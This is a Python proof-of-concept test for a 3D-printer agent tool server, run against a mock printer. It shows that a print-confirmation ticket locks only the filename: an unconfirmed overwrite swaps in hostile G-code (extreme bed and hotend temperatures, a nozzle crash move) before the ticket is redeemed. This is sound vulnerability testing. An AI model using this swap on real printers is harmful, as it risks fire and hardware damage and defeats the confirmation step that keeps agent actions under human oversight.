"""Ticket for start_print locks only the filename; the file behind it can be swapped
by a LOW-tier upload between issue and redeem."""
import sys, os, asyncio, json, contextlib
sys.path.insert(0, os.getcwd()); sys.path.insert(0, os.path.join(os.getcwd(), "tests"))
os.environ["QIDI_TEST_MODE"]="1"
from aiohttp import web
from mock_moonraker import MockPrinter, build_app
from qidi_mcp.config import load_settings
from qidi_mcp.server import build_server

async def call(server, name, **kw):
    r = await server.call_tool(name, kw)
    s = getattr(r, "structuredContent", None)
    if s is not None: return s
    if isinstance(r, tuple): return r[1]
    t = r.content[0].text
    with contextlib.suppress(Exception): return json.loads(t)
    return t

async def main():
    printer = MockPrinter(); app = build_app(printer)
    runner = web.AppRunner(app); await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", 0); await site.start()
    port = runner.addresses[0][1]
    server, rt = build_server(load_settings({"QIDI_PRINTER_URL": f"http://127.0.0.1:{port}", "QIDI_TEST_MODE": "1"}))
    try:
        # 1. innocuous file uploaded (LOW tier, no confirm)
        r = await call(server, "upload_gcode", filename="benign.gcode", content="G28\nM117 hello\n")
        print("upload benign:", r.get("ok"), "| size", r.get("size_bytes"))
        # 2. agent asks to print it, reviews metadata, gets a ticket
        t = await call(server, "start_print", filename="benign.gcode")
        print("ticket:", t["status"], t["arguments_locked_to"], "size_bytes shown:", t["about_to_print"]["size_bytes"])
        tok = t["confirm_token"]
        # 3. BEFORE redeeming, replace the file contents. overwrite=True is Risk.LOW: no confirm, no ticket.
        evil = "M140 S120\nM104 S350\nG1 Z-5 F3000\n" * 10
        r = await call(server, "upload_gcode", filename="benign.gcode", content=evil, overwrite=True)
        print("overwrite w/ hostile content, no confirm needed:", r.get("ok"), "| replaced_existing:", r.get("replaced_existing"), "| size", r.get("size_bytes"))
        # 4. redeem the ticket issued for the OLD content
        r = await call(server, "start_print", filename="benign.gcode", confirm_token=tok)
        print("redeem:", r)
        print("MOCK PRINTER STATE:", printer.print_state, printer.print_filename, "| file size now", printer.files["benign.gcode"]["size"])
        print("audit tail:", [(e["tool"], e["risk"], e["outcome"]) for e in rt.policy.audit.tail()])
    finally:
        await rt.aclose(); await runner.cleanup()
asyncio.run(main())
